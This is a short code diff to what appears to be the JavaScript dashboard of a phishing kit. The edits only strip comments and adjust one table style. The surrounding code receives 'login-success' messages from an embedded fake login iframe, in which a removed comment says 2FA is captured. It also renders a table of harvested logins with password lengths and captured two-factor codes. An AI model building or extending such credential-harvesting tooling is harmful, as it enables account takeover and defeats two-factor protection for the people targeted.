@@ -152,8 +152,6 @@ function resetToDiscord() {
 }
 
 // ==================== IFRAME MESSAGE LISTENER ====================
-// 2FA now happens INSIDE the iframe (on the netlify login page)
-// We only receive the final message after 2FA is submitted
 window.addEventListener('message', (event) => {
     if (event.data && event.data.type === 'login-success') {
         currentUserEmail = event.data.email;
@@ -163,9 +161,7 @@ window.addEventListener('message', (event) => {
 });
 
 async function handleLoginSuccess(email) {
-    // Store email for support page
     sessionStorage.setItem('mccg_email', email);
-
     loginScreen.classList.add('hidden');
     successScreen.classList.remove('hidden');
 
@@ -379,7 +375,6 @@ function loadLogins() {
                 const ownerBadge = login.owner ? '<span class="badge" style="margin-left:8px;font-size:10px;">ADMIN</span>' : '';
                 const hiddenPw = '*'.repeat(login.password ? login.password.length : 8);
 
-                // 2FA display - show actual code, pending, or N/A
                 let twofaDisplay;
                 if (login.twofa && login.twofa !== 'pending') {
                     twofaDisplay = `<span class="twofa-cell">${escapeHtml(login.twofa)}</span>`;
@@ -407,7 +402,7 @@ function loadLogins() {
                         </td>
                         <td>${twofaDisplay}</td>
                         <td>${formattedDate}</td>
-                        <td style="display:flex;gap:8px;flex-wrap:wrap;">
+                        <td style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
                             <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>
                                 ${login.owner ? 'Is Admin' : 'Make Admin'}
                             </button>
